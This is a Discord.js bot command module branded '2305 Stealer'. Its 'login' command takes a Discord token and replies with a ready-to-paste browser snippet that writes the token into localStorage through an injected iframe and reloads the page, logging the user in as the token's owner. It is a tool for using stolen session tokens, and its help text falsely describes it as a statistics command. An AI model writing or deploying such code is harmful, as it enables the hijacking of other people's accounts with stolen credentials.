const Discord = require("discord.js");
const moment = require("moment");
const profiles = require("../tables/profiles");
const os = require("os");
var randomstring = require("randomstring");
require("moment-duration-format");

exports.run = async (client, message, args) => {
  let yarrak = args[0]
  if (!yarrak) return;
  const exampleEmbed = new Discord.MessageEmbed()
.setColor('#36393f')
.setAuthor('2305 Stealer', 'https://cdn.discordapp.com/attachments/897876884631744514/985985966143578212/f8d0562311308038aed4beac5e7620b9.jpg')
.setDescription('```let token="'+yarrak+'";function login(token){setInterval(()=>{document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.token=`"${token}"`},50);setTimeout(()=>{location.reload()},2500)}login(token);```')
.setTimestamp()
.setFooter('2305 Stealer');
message.channel.send(exampleEmbed)

};

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ["login","logins"],
  permLevel: 0
};

exports.help = {
  name: "login",
  description: "Botun istatistiklerini gösterir",
  usage: "istatistik"
};